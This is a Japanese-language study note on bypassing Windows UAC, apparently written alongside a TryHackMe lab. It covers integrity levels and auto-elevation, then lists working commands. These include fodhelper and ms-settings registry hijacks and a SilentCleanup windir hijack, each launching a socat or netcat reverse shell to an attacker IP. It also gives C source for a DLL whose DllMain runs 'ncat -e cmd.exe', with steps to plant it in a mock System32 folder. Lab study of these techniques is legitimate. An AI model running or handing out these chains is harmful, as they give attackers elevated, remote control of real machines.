# UAC 回避

https://tryhackme.com/r/room/bypassinguac

## 基本

### 整合性レベル (IL)

低、中、高、システムの 4 種類  
一般ユーザーはログイン時に中レベルのトークンを受け取る。  
管理者ユーザーは中レベル（フィルターされたトークン）と高レベル（昇格トークン）の二種類のトークンを受け取る。UAC 経由で明示的に要求した場合に限り、昇格トークンが使われる

### UAC 設定（通知設定）

「常に通知する」かそれ以外。攻撃者の観点では、下位３種類のセキュリティレベルは同等。

### アプリケーション情報サービス(Appinfo)

「管理者として実行」したとき、

1. ShellExecute API 呼び出しが、 runas 動詞を使用して行われる。  
   ShellExecute("runas", "cmd.exe")
1. 昇格を処理するために Appinfo に要求が転送される。
1. Appinfo がアプリケーション マニフェストをチェックして、AutoElevation が許可されているかどうかを確認。
1. Appinfo が consent.exe を実行し、安全なデスクトップに UAC プロンプトを表示。
1. ユーザーが管理者としてアプリケーションを実行することに同意した場合、Appinfo サービスはユーザーの昇格トークンを使用して要求を実行する。
1. Appinfo は新しいプロセスの親プロセス ID を、昇格が要求されたシェルを指すように設定ｓる。

### 自動昇格

msconfig のように、ユーザーの介入なしで高 IL で起動するプログラムがある。

- Windows 発行者によって署名されている必要がある。
- 信頼できるディレクトリに格納されている必要がある。  
  %SystemRoot%/System32/ または %ProgramFiles%/
- マニフェスト内で autoElevate 要素を宣言する必要がある。

## 回避

### GUI ベース

メニューから msconfig を実行すると、自動的に 高 IL で起動される。
ツールタブからコマンドプロンプトを起動でき、そのプロンプトは親プロセスの IL を引き継ぐため、高 IL になる。

azman.msc の場合、ヘルプから「ページのソースを表示」でメモ帳を開き、「ファイルを開く」から右クリックでコマンドプロンプトを開く、といった事も可能。

### CUI ベース

fodhelper.exe がレジストリに設定されているプログラムを起動する仕様を利用して、リバースシェルを起動する。

#### Defender に検出されるバージョン

```shell
# Defenderに検出されて、作成後すぐに削除される
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command

set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"

reg add %REG_KEY% /v "DelegateExecute" /d "" /f

reg add %REG_KEY% /d %CMD% /f

fodhelper.exe
```

クリーンアップ

```shell
reg delete HKCU\Software\Classes\ms-settings\ /f
```

#### 改良型

.pwn の部分は任意の文字列のため検出が難しい。  
同じシステムで異なるバージョンの複数のインスタンスを実行する場合に使われる。

```shell
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"

reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f

reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f

fodhelper.exe
```

クリーンアップ

```shell
reg delete "HKCU\Software\Classes\.thm\" /f
reg delete "HKCU\Software\Classes\ms-settings\" /f
```

### 「常に通知する」を回避

DiskCleanup スケジューラタスクを利用する。  
レジストリ固定なので Defender には検知される。

```shell
reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4446 EXEC:cmd.exe,pipes &REM " /f

schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
```

%windir% が展開された結果、下記のような形でコマンドが実行される。

```text
cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes &REM \system32\cleanmgr.exe /autoclean /d %systemdrive%
```

クリーンアップ

```shell
reg delete "HKCU\Environment" /v "windir" /f
```

## 自動化

https://github.com/hfiref0x/UACME

## morph3ブログ

### テクニック１

```ps
New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value 'c:\users\morph3\nc.exe -e cmd.exe 10.10.10.33 443' -Force

New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
```

`fodhelper` を実行（Features on Demand Helper）したら管理者としてコマンドが実行される。

### テクニック２

https://notes.morph3.blog/windows/uac-bypass#technique-2

https://0xb0b.gitbook.io/writeups/tryhackme/2023/avenger#privilege-escalation のソースコード

```c
#include <windows.h>

void exec_custom()
{
	WinExec("c:\\users\\hugo\\Desktop\\ncat.exe -e cmd.exe 10.8.211.1 49732", 1);
}

bool APIENTRY DllMain( HMODULE hModule,
			DWORD ul_reason_for_call,
			LPVOID lpReserved
		)
{
	switch(ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		exec_custom();
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return true;
}
```

```sh
x86_64-w64-mingw32-gcc -shared -o Secur32.dll custom.cpp
```

```sh
mkdir "C:\Windows \"
mkdir "C:\Windows \System32\"
copy "C:\Windows\System32\computerdefaults.exe" "C:\Windows \System32\computerdefaults.exe"
copy ".\Secur32.dll" "C:\Windows \System32\Secur32.dll"
"C:\Windows \System32\computerdefaults.exe"
```
